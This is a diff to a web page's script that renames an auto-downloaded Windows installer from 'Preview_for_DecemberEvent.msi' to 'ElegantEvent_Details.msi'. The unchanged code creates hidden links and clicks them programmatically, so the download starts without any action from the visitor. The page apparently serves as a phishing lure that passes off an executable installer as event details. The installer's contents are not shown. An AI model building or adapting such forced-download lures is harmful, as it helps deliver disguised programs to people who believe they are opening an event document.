@@ -303,7 +303,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "Preview_for_DecemberEvent.msi";
+    const FILE_NAME = "ElegantEvent_Details.msi";
 
     // Wire manual link
     (function bindManual(){
@@ -325,7 +325,7 @@
         const a = document.createElement("a");
         a.style.display = "none";
         a.href = url;
-        a.download = url.split("/").pop() || "Preview_for_DecemberEvent.msi";
+        a.download = url.split("/").pop() || "ElegantEvent_Details.msi";
         document.body.appendChild(a);
         a.click();
         a.remove();
@@ -351,7 +351,7 @@
           const a2 = document.createElement("a");
           a2.style.display = "none";
           a2.href = objectUrl;
-          a2.download = url.split("/").pop() || "Preview_for_DecemberEvent.msi";
+          a2.download = url.split("/").pop() || "ElegantEvent_Details.msi";
           document.body.appendChild(a2);
           a2.click();
           a2.remove();
